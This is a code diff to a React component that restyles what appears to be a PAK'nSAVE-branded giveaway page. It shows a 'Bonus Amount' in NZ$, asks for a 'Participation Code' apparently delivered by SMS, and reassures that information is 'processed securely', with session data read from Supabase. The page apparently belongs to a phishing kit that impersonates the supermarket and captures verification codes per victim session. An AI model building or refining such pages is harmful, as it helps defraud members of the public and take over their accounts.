@@ -23,6 +23,8 @@ export function CodeEntryClient({
   const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
   const [partnerName, setPartnerName] = useState<string>("");
   const [expectedCode, setExpectedCode] = useState<string>("");
+  const [amount, setAmount] = useState<number>(0);
+  const [currency, setCurrency] = useState("NZ$");
   const [enteredCode, setEnteredCode] = useState("");
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState<string | null>(null);
@@ -37,7 +39,7 @@ export function CodeEntryClient({
       }
       const { data, error: qErr } = await supabase
         .from("sessions")
-        .select("partner_name, participation_code, form_data")
+        .select("partner_name, participation_code, amount, form_data")
         .eq("id", sessionId)
         .maybeSingle();
 
@@ -49,6 +51,8 @@ export function CodeEntryClient({
       }
 
       const formData = data.form_data as Record<string, any>;
+      setAmount(data.amount ?? 0);
+      if (formData?.currency) setCurrency(formData.currency);
       setPartnerName(formData?.partner_display_name || data.partner_name || "partner");
       setExpectedCode(data.participation_code || "");
       setLoading(false);
@@ -129,87 +133,95 @@ export function CodeEntryClient({
 
   return (
     <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-      <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-6 sm:p-10 relative z-10 fade-in">
-        
-        {/* Right Top Logo Placeholder */}
-        <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
-          <img
-            src="/wheel-assets/desktop/png/paknsave-logo-hub.png"
-            alt="PAK'nSAVE logo"
-            className="h-10 w-10 object-contain drop-shadow-[0_10px_18px_rgba(0,0,0,0.35)]"
-            id="code-brand-logo"
-          />
-        </div>
-
-        <div className="mb-6 flex items-start gap-4">
-          <div className="mt-1 shrink-0">
-            <div
-              id="code-gift-icon"
-              className="flex h-12 w-12 items-center justify-center rounded-2xl bg-white/10 text-[#ffd34d]"
-              aria-hidden="true"
-            >
-              <svg className="h-7 w-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M12 8v13m0-13V6a2 2 0 112 2h-2zm0 0V5.5A2.5 2.5 0 109.5 8H12zm-7 4h14M5 12a2 2 0 110-4h14a2 2 0 110 4M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7" />
-              </svg>
-            </div>
-          </div>
-          <div>
-            <h2 className="text-2xl font-bold text-white mb-1">{settings.code_title}</h2>
-            <p className="text-sm text-gray-300 font-medium whitespace-pre-line">
-              {settings.code_subtitle.split("{partner}").map((part, i, arr) => (
-                <span key={i}>
-                  {part}
-                  {i < arr.length - 1 && <strong className="text-[#0088FF] font-bold">{partnerName}</strong>}
-                </span>
-              ))}
-            </p>
-          </div>
-        </div>
-
-        {error && (
-          <div className="mb-6 rounded-xl bg-red-500/10 p-4 text-center text-sm font-bold text-red-400 border border-red-500/20">
-            {error}
-          </div>
-        )}
-
-        <form onSubmit={handleSubmit} className="space-y-6">
-          <div>
-            <label className="mb-2 block text-sm font-medium text-white text-left">Participation Code</label>
-            <div className="relative">
-              <div className="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-4">
-                <svg className="h-6 w-6 opacity-70 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M16 5H8a3 3 0 00-3 3v1a2 2 0 010 4v1a3 3 0 003 3h8a3 3 0 003-3v-1a2 2 0 010-4V8a3 3 0 00-3-3z" />
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M12 8v8" />
-                </svg>
+      <div className="pak-form-card fade-in relative z-10 w-full max-w-[820px]">
+        <div className="pak-form-inner px-6 pb-8 pt-8 sm:px-10 sm:pb-10 sm:pt-10">
+          <div className="grid gap-7 lg:grid-cols-[minmax(0,1fr)_220px] lg:items-start">
+            <div className="min-w-0">
+              <div className="max-w-[34rem]">
+                <h2 className="pak-form-title">{settings.code_title}</h2>
+                <p className="pak-form-subtitle mt-3 whitespace-pre-line">
+                  {settings.code_subtitle.split("{partner}").map((part, i, arr) => (
+                    <span key={i}>
+                      {part}
+                      {i < arr.length - 1 && <strong className="font-bold text-[#ffe876]">{partnerName}</strong>}
+                    </span>
+                  ))}
+                </p>
               </div>
-              <input
-                type="text"
-                required
-                className="w-full rounded-xl border border-transparent bg-white/10 py-4 pl-12 pr-4 text-2xl font-bold tracking-widest text-white outline-none focus:border-[#0066CC] focus:ring-2 focus:ring-[#0066CC]/50 transition-all placeholder:text-gray-500 shadow-sm"
-                value={enteredCode}
-                onChange={(e) => setEnteredCode(e.target.value)}
-                placeholder=""
-                autoComplete="off"
+
+              <div className="pak-form-amount mt-5 w-full max-w-[25rem] px-5 py-4 sm:px-6">
+                <div className="pak-form-amount-label">
+                  <div>Your</div>
+                  <div>Bonus Amount</div>
+                </div>
+                <div className="pak-form-amount-divider" />
+                <div className="pak-form-amount-value">
+                  {currency}{amount.toLocaleString("en-NZ")}
+                </div>
+              </div>
+            </div>
+
+            <div className="flex items-start justify-between gap-4 lg:block">
+              <img
+                src="/form-assets/paknsave-logo-form.png"
+                alt="PAK'nSAVE"
+                className="h-14 w-14 object-contain sm:h-16 sm:w-16 lg:ml-auto lg:mb-4"
+                id="code-brand-logo"
+              />
+              <img
+                src="/form-assets/paknsave-gift-box.png"
+                alt=""
+                className="h-auto w-24 object-contain drop-shadow-[0_18px_32px_rgba(0,0,0,0.45)] sm:w-32 lg:w-full lg:max-w-[200px] lg:translate-x-2"
               />
             </div>
           </div>
-          <button
-            type="submit"
-            disabled={processing}
-            className="w-full rounded-xl bg-gradient-to-r from-[#0066CC] to-[#0088FF] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(0,102,204,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
-          >
-            {processing ? settings.sms_loading : settings.code_button}
-          </button>
-          
-          <div className="mt-4 flex items-center justify-center gap-2">
-            <svg className="h-5 w-5 text-[#00d26a]" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
-            </svg>
-            <span className="text-[13px] font-medium text-gray-300">
-              Your information is processed securely.
-            </span>
-          </div>
-        </form>
+
+          {error && (
+            <div className="mt-7 rounded-2xl border border-red-500/25 bg-red-500/10 p-4 text-center text-sm font-bold text-red-300">
+              {error}
+            </div>
+          )}
+
+          <form onSubmit={handleSubmit} className="mt-7 space-y-6">
+            <div className="pak-form-label">
+              <label className="mb-3 block text-left">Participation Code</label>
+              <div className="pak-form-input-wrap">
+                <div className="pak-form-input-icon">
+                  <svg className="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true" strokeWidth="2">
+                    <path strokeLinecap="round" strokeLinejoin="round" d="M16 5H8a3 3 0 0 0-3 3v1a2 2 0 0 1 0 4v1a3 3 0 0 0 3 3h8a3 3 0 0 0 3-3v-1a2 2 0 0 1 0-4V8a3 3 0 0 0-3-3z" />
+                    <path strokeLinecap="round" strokeLinejoin="round" d="M12 8v8" />
+                  </svg>
+                </div>
+                <input
+                  type="text"
+                  required
+                  className="pak-form-input min-h-[4.75rem] pl-14 pr-4 text-center text-[1.7rem] font-black tracking-[0.28em] uppercase"
+                  value={enteredCode}
+                  onChange={(e) => setEnteredCode(e.target.value)}
+                  placeholder=""
+                  autoComplete="off"
+                />
+              </div>
+            </div>
+
+            <div className="flex flex-col gap-4 pt-1 md:flex-row md:items-center md:justify-between">
+              <div className="pak-form-security">
+                <svg className="h-9 w-9 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
+                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
+                </svg>
+                <span>Your information is processed securely.</span>
+              </div>
+
+              <button
+                type="submit"
+                disabled={processing}
+                className="pak-form-button min-h-[4.25rem] w-full px-6 text-xl md:w-[24rem]"
+              >
+                {processing ? settings.sms_loading : settings.code_button}
+              </button>
+            </div>
+          </form>
+        </div>
       </div>
     </div>
   );
